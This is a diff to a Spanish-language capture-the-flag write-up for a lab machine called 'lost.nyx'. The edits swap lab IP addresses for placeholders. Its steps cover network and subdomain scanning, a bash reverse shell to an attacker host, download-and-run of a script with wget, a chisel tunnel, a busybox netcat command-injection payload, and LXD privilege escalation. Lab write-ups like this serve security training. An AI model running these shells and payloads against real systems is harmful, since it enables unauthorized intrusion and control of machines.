@@ -2,12 +2,12 @@
 
 ## Escaneo de Red y Descubrimiento de Servicios
 
-Se realizó un escaneo de red y descubrimiento de servicios en el host "192.168.200.24" utilizando las siguientes herramientas:
+Se realizó un escaneo de red y descubrimiento de servicios en el host "(IP-victima)" utilizando las siguientes herramientas:
 
 ```bash
 arp-scan -I eth0 --localnet
 (IP-Victima)
-nmap -p 22,80 -sS -sC -sV -n -Pn 192.168.200.24 -oN nmap
+nmap -p 22,80 -sS -sC -sV -n -Pn (IP-victima) -oN nmap
 ```
 
 Los resultados indican la presencia de servicios SSH y HTTP con detalles sobre las versiones y el título de la página web.
@@ -23,7 +23,7 @@ http-title: lost.nyx
 Se enlazo la IP-victima con "lost.nyx" en "/etc/hosts" y se procedió a la enumeración de subdominios utilizando wfuzz y se identificó un subdominio llamado "dev".
 
 ```bash
-wfuzz --hc=404 --hl=34 -w /usr/share/dnsrecon/subdomains-top1mil-20000.txt -H 'host: FUZZ.lost.nyx' -u 192.168.200.24
+wfuzz --hc=404 --hl=34 -w /usr/share/dnsrecon/subdomains-top1mil-20000.txt -H 'host: FUZZ.lost.nyx' -u (IP-victima)4
 ```
 
 Al encontrar "dev" como un subdominio, se agregó la entrada correspondiente en el archivo "/etc/hosts".
@@ -94,14 +94,14 @@ whoami
 Se procedió a crear una reverse shell para facilitar el acceso remoto a la máquina víctima. Se creó un script llamado "rev.sh" con el siguiente contenido:
 
 ```bash
-bash -i >& /dev/tcp/192.168.200.5/443 0>&1
+bash -i >& /dev/tcp/(IP-acatante)/443 0>&1
 python3 -m http.server 8000
 ```
 
 Luego, se estableció un servidor HTTP en la máquina atacante y se puso en escucha con Netcat en el puerto 443. En la máquina víctima, se descargó y ejecutó el script.
 
 ```bash
-wget http://192.168.200.5:8000/rev.sh
+wget http://(IP-acatante):8000/rev.sh
 chmod 777 rev.sh
 bash rev.sh
 ```
@@ -147,7 +147,7 @@ python3 -m http.server 8000
 
 **Máquina víctima:**
 ```bash
-wget http://192.168.200.5:8000/chisel
+wget http://(IP-acatante):8000/chisel
 chmod 777 chisel
 ./chisel client 192.168.200.5:4000 R:3000:127.0.0.1:3000
 ```
@@ -175,7 +175,7 @@ Al acceder a la URL [http://127.0.0.1:3000](http://127.0.0.1:3000), se descubre 
 Se logró el acceso a la máquina mediante la siguiente inyección:
 
 ```plaintext
-busybox${IFS}nc${IFS}192.168.200.5${IFS}6969${IFS}-e${IFS}sh
+busybox${IFS}nc${IFS}(IP-acatante)${IFS}6969${IFS}-e${IFS}sh
 ```
 
 [Fuente](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md)
@@ -216,7 +216,7 @@ La imagen Alpine fue descargada en la máquina víctima y se procedió a realiza
 ```bash
 #Maquina victima:
 #Obtenemos la imagen
-wget http://192.168.200.5:8000/alpine-v3.19-x86_64-20240303_1743.tar.gz
+wget http://(IP-acatante):8000/alpine-v3.19-x86_64-20240303_1743.tar.gz
 #Importamos
 lxc image import alpine-v3.19-x86_64-20240303_1743.tar.gz --alias
 #Aseguramos su correcta importacion
